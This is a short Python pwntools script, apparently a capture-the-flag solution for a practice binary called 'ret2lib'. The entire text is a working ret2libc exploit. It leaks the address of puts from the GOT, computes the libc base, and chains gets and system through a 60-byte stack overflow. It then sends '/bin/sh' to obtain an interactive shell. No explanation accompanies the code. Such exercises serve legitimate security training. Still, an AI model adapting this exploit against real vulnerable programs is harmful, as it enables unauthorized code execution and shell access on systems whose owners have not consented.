from pwn import *

puts_got_plt = 0x804A01C
puts_off = 0x00064da0

c = process('ret2lib')
c.recvuntil(':')
c.sendline(str(puts_got_plt))
c.recvuntil(':')
libc_base = int(c.recvuntil('\n').strip(), 16) - puts_off
gets = 0x00064440 + libc_base
system = 0x0003fe70 +libc_base
buf = 0x0804b000 - 30
rop = [
	gets,
	system,
	buf,
	buf
]
c.recvuntil(':')
c.sendline('a'*60 + flat(rop))
sleep(2)
c.sendline('/bin/sh\x00')

c.interactive()
